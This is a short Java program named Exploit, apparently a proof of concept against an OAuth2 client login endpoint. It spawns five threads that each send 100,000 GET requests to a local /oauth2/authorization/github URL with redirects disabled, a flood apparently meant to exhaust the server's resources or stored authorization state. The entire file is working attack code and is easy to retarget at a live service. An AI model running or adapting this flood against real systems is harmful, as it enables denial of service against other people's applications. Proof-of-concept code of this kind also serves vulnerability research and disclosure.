package dev.maczkowski.oauthclientexploit;

import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;

import org.apache.http.HttpResponse;
import org.apache.http.client.HttpClient;
import org.apache.http.client.methods.HttpGet;
import org.apache.http.impl.client.HttpClients;

public class Exploit {

    private static final int CONNECTIONS = 5;

    public static void main(String[] args) {
        ExecutorService executorService = Executors.newFixedThreadPool(CONNECTIONS);

        for (int i = 0; i < CONNECTIONS; i++) {
            executorService.execute(new GrantRequest());
        }
        executorService.shutdown();
    }

    private static class GrantRequest implements Runnable {

        @Override
        public void run() {

            HttpClient client = HttpClients.custom()
                    .setConnectionReuseStrategy((response, context) -> true)
                    .disableRedirectHandling()
                    .build();

            for (int i = 0; i < 100000; i++) {
                try {
                    HttpGet httpGet = new HttpGet("http://localhost:8080/oauth2/authorization/github");
                    HttpResponse httpResponse = client.execute(httpGet);
                    System.out.println("Thread: " + Thread.currentThread().getId() + " Request: " + (i + 1) + " - " + httpResponse.getStatusLine().getStatusCode());
                } catch (Exception e) {
                    System.err.println("Thread: " + Thread.currentThread().getId() + " Request: " + (i + 1) + " - " + e.getMessage());
                }
            }
        }
    }
}
